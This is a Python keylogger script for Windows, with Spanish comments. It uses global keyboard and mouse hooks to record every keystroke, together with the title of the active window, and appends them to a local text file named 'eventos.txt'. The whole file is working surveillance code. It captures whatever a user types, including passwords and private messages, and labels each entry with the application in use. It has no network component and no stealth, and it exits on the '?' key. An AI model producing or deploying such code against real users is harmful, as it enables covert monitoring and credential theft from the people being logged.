from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeyboardListener
import sys, os
from typing import Optional
from ctypes import wintypes, windll, create_unicode_buffer
from threading import Timer
#from win32gui import GetWindowText, GetForegroundWindow
#print(GetWindowText(GetForegroundWindow())) - obtener ventana

caps_lock = 0
screen = None
alt = False
tab = False
#saber que ventana está activa
def setTimeout():
    r = Timer(1, getForegroundWindowTitle)
    r.start()

def writeText(text):
     with open('eventos.txt', 'a') as file:
        file.write(text)

def getForegroundWindowTitle() -> Optional[str]:
    global screen
    hWnd = windll.user32.GetForegroundWindow()
    length = windll.user32.GetWindowTextLengthW(hWnd)
    buf = create_unicode_buffer(length + 1)
    windll.user32.GetWindowTextW(hWnd, buf, length + 1)
    
    # 1-liner alternative: return buf.value if buf.value else None
    if buf.value:
        if screen != buf.value:
            screen = buf.value
            print(screen)
            writeText("\n\n"+screen+"\n")
            writeText("========================================================")
    else:
        screen = None

getForegroundWindowTitle()
#Mayúsculas
def get_capslock_state():
    #import ctypes
    hllDll = windll.user32 #ctypes.WinDLL ("User32.dll")
    VK_CAPITAL = 0x14
    return hllDll.GetKeyState(VK_CAPITAL)

def atajo(key):
    global alt
    result = False
    if key.lower() == 'tab':
        if alt:
            result = True
        else:
            writeText("\n")
    elif key.lower() == 'alt_l':
        alt = True
    print("result "+str(result))
    return result

def reset_atajo():
    global alt, tab
    alt = False
    tab = False

def evento_teclado(key):
    global caps_lock
    l = str((key))
    l = l.replace("'", "")
    print(l)
    if 'key' in l.lower():
        l = l[4:]
    print(l)
    if l in ['alt_l', 'tab']:
        if atajo(l):
            writeText("\n")
            setTimeout()
            reset_atajo()
    else:
        reset_atajo()
    if l == '?':
        print("l+"+l)
        sys.exit()
    if l == 'space':
        l=' '
    if l == 'enter':
        l='\n'
    if l == 'caps_lock':
        caps_lock = get_capslock_state()
    if l not in ['alt_l', 'caps_lock', 'esc', 'shift', 'tab', 'ctrl_l', 'ctrl_r', 'alt_gr', 'num_lock', 'home', 'page_up', 'end', 'page_down', 'insert', 'menu']:
        if caps_lock == 65409:
            l = l.upper();
        if l in ['backspace', 'enter', 'delete']:
            l = l+'\n'
        writeText(l)    

def evento_move(x, y):
    pass
    
def evento_click(x, y, button, pressed):
    print('{0} at {1}'.format(
        'Pressed' if pressed else 'Released',
        (x, y)))
    setTimeout()
    
def evento_scroll(x, y, dx, dy):
    pass

def evento_release(key):
    pass

caps_lock = get_capslock_state()

#with mouseLis (on_move=evento_mouse) as lis:
 #   lis.join()
    
#with keyLis (on_press=evento_teclado) as l:
 #   l.join()
    
keyboard_listener = KeyboardListener(on_press=evento_teclado, on_release=evento_release)
mouse_listener = MouseListener(on_move=evento_move, on_click=evento_click, on_scroll=evento_scroll)

# Start the threads and join them so the script doesn't end early
keyboard_listener.start()
mouse_listener.start()
keyboard_listener.join()
mouse_listener.join()